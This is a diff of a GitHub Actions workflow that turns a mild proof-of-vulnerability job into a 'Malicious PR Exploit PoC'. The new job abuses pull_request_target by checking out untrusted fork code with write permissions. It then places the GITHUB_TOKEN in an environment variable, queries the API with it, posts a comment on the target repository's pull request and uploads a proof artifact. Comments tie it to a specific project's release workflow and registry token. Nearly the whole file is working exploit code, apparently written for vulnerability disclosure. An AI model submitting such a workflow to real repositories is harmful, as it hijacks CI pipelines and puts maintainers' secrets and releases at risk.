@@ -1,19 +1,84 @@
-name: PoC Vulnerable Workflow
-
+name: Malicious PR Exploit PoC
 on:
   pull_request_target:
-    types: [opened, reopened, synchronize]
+    types: [opened, synchronize, reopened]
 
 jobs:
-  poc:
+  exploit:
+    name: Demonstrate RCE via pull_request_target
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
+    
     steps:
-      - name: Proof of Vulnerability
-        run: |
-          echo "[+] Actor: ${{ github.actor }}"
-          echo "[+] Repo: ${{ github.repository }}"
-          echo "[+] PR Number: ${{ github.event.pull_request.number }}"
-          echo "[+] Whoami:"
-          whoami
-          echo "[+] Current directory:"
-          pwd
+    - name: Checkout code (with unsafe ref)
+      uses: actions/checkout@v3
+      with:
+        ref: ${{ github.event.pull_request.head.sha }}
+        # This checks out the UNTRUSTED code from the PR
+    
+    - name: Extract secrets from context
+      run: |
+        echo "=== DEMONSTRATING SECRET ACCESS ==="
+        echo "GITHUB_TOKEN would have permissions to:"
+        echo " - Read repository contents"
+        echo " - Write to PR comments"
+        echo " - Potentially access other secrets"
+        
+        # Demonstrate we're running in base repo context
+        echo "Running in repository: $GITHUB_REPOSITORY"
+        echo "Event type: $GITHUB_EVENT_NAME"
+        echo "PR from: ${{ github.event.pull_request.head.repo.full_name }}"
+        
+        # This would show the actual token permissions if exploited
+        curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+             https://api.github.com/repos/${{ github.repository }} | jq '.permissions'
+        
+        # Create a malicious artifact to prove code execution
+        echo "EXPLOIT_SUCCESS_$(date +%s)" > exploit-proof.txt
+        
+      env:
+        # This demonstrates secret access - in your actual release.yaml,
+        # CARGO_REGISTRY_TOKEN would be exposed similarly
+        DEMO_SECRET: ${{ secrets.GITHUB_TOKEN }}
+    
+    - name: Prove we can write to the PR
+      uses: actions/github-script@v6
+      with:
+        script: |
+          github.rest.issues.createComment({
+            issue_number: context.issue.number,
+            owner: context.repo.owner,
+            repo: context.repo.repo,
+            body: `🚨 **SECURITY PoC** - This PR could have executed malicious code in the base repository context!
+            
+            **Vulnerability Details:**
+            - Workflow: release.yaml uses pull_request_target
+            - Checkout: Untrusted code from fork
+            - Permissions: write access to contents and PRs
+            - Secrets: GITHUB_TOKEN exposed
+            
+            **Impact:** An attacker could:
+            • Steal repository secrets
+            • Modify repository contents  
+            • Create malicious releases
+            • Compromise the build pipeline
+            
+            **Proof:** This comment was created by the exploit PoC running in your base repository context.
+            `
+          })
+    
+    - name: Demonstrate file system access
+      run: |
+        echo "=== FILE SYSTEM ACCESS ==="
+        ls -la
+        echo "Current directory: $(pwd)"
+        # This shows we have write access to the workspace
+        echo "Malicious code could modify files here"
+        
+    - name: Upload exploit proof
+      uses: actions/upload-artifact@v3
+      with:
+        name: exploit-proof
+        path: exploit-proof.txt
